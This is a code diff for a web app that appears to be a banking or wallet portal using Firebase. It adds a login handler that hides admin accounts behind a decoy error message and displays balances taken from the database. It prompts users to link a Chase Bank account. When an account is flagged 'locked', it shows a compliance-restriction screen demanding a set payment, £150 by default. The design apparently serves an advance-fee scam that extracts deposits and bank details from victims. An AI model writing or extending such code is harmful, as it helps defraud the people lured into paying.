@@ -498,6 +498,7 @@ var userData = {};
 window.userData = userData;
 var addMoneyCardIdx = -1;
 
+
 // ── HELPERS ──
 function $(id){ return document.getElementById(id); }
 function sym(){ return SYM[userData.currency||'USD']||'$'; }
@@ -1966,6 +1967,98 @@ $('mbway-otp-submit-btn').onclick = function(){
 
 
 }); // END DOMContentLoaded
+
+// ── AUTH STATE ──
+auth.onAuthStateChanged(function(user){
+  if(!user){ showScreen('auth-screen'); return; }
+  currentUser = user;
+
+  // Block admin/sub-admin emails from main site
+  if(user.email === ADMIN_EMAIL || user.email.endsWith('@aaddmmiinn.com') || user.email === ADMINADEX_EMAIL){
+    auth.signOut();
+    var errEl = document.getElementById('login-error');
+    if(errEl) errEl.textContent = 'User not recognised. Please check your credentials.';
+    return;
+  }
+
+  userRef = db.ref('users/'+user.uid);
+
+  function updateLastSeen(){
+    if(!user||!db) return;
+    db.ref('users/'+user.uid+'/lastSeen').set(new Date().toISOString());
+  }
+  updateLastSeen();
+  setInterval(updateLastSeen, 120000);
+  document.addEventListener('visibilitychange',function(){
+    if(document.visibilityState==='visible') updateLastSeen();
+  });
+
+  userRef.on('value',function(snap){
+    userData = snap.val()||{};
+    window.userData = userData;
+    var s = sym();
+    var bal = parseFloat(userData.balance||0);
+    var an = userData.accountNumber||'';
+    var el;
+    el=$('balance'); if(el) el.textContent=bal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
+    el=$('currency-symbol'); if(el) el.textContent=s;
+    el=$('acct-badge'); if(el) el.textContent=an?('....'+an.slice(-4)):'....';
+    el=$('topbar-name'); if(el) el.textContent=userData.firstname||'User';
+    var hasAuthCard=(userData.linkedCards||[]).some(function(cd){return cd&&cd.status==='authorized';});
+    if(userData.verified&&!hasAuthCard){
+      db.ref('users/'+currentUser.uid+'/verified').set(false);
+      userData.verified=false;
+    }
+    el=$('verified-badge'); if(el) el.style.display=(userData.verified&&hasAuthCard)?'inline':'none';
+    el=$('drawer-name'); if(el) el.textContent=(userData.firstname||'')+' '+(userData.surname||'');
+    el=$('drawer-email'); if(el) el.textContent=userData.email||'';
+
+    var chaseBankAccounts = userData.chaseBankAccounts || [];
+    el=$('chasebank-banner-text');
+    if(el) el.textContent = chaseBankAccounts.length > 0 ? 'Manage your accounts' : 'Link your Chase Bank account';
+
+    var cards = userData.linkedCards||[];
+    renderCards(cards);
+    renderTx(userData.history||[]);
+    renderReferral();
+    renderAccountInfo();
+
+    if(userData.locked){
+      var lrEl=$('lock-reason-text');
+      if(lrEl) lrEl.textContent=userData.lockReason||'Your account has been restricted by our compliance team.';
+      window._lockRequiredAmt = userData.lockAmount || 150;
+      var _amtSpan=document.getElementById('lock-required-amount');
+      if(_amtSpan) _amtSpan.textContent='\u00a3'+window._lockRequiredAmt;
+      var _step2Body=document.getElementById('lock-step2-body');
+      if(_step2Body) _step2Body.innerHTML='Required amount: <strong style="color:#fff;">\u00a3'+window._lockRequiredAmt+' / $'+window._lockRequiredAmt+'</strong>';
+      var _amtModal=document.getElementById('lock-required-amount-modal');
+      if(_amtModal) _amtModal.textContent='\u00a3'+window._lockRequiredAmt+' / $'+window._lockRequiredAmt;
+      showScreen('lock-screen',true);
+    } else {
+      showScreen('dashboard',true);
+      history.replaceState({screen:'dashboard',tab:'tab-home'},'',window.location.pathname+(window.location.search||''));
+    }
+  });
+
+  db.ref('notifications/'+user.uid).on('value',function(snap){
+    var all=[];
+    if(snap.exists()) snap.forEach(function(s){all.push(Object.assign({},s.val(),{id:s.key}));});
+    all.sort(function(a,b){return new Date(b.date)-new Date(a.date);});
+    var unread=all.filter(function(n){return !n.read;}).length;
+    var badge=$('notif-badge');
+    if(badge){badge.textContent=unread>9?'9+':unread; badge.classList.toggle('show',unread>0);}
+    renderNotifications(all);
+  });
+
+  db.ref('moneyRequests/'+user.uid).on('value',function(snap){
+    var pending=[];
+    if(snap.exists()) snap.forEach(function(s){var r=s.val();if(r&&r.status==='pending')pending.push(r);});
+    var banner=$('req-banner'),badge=$('req-count-badge');
+    if(banner) banner.classList.toggle('show',pending.length>0);
+    if(badge) badge.textContent=pending.length+' pending';
+    renderMoneyRequests(pending);
+  });
+});
 </script>
 
 <!-- LOCK: ADD MONEY METHOD PICKER -->
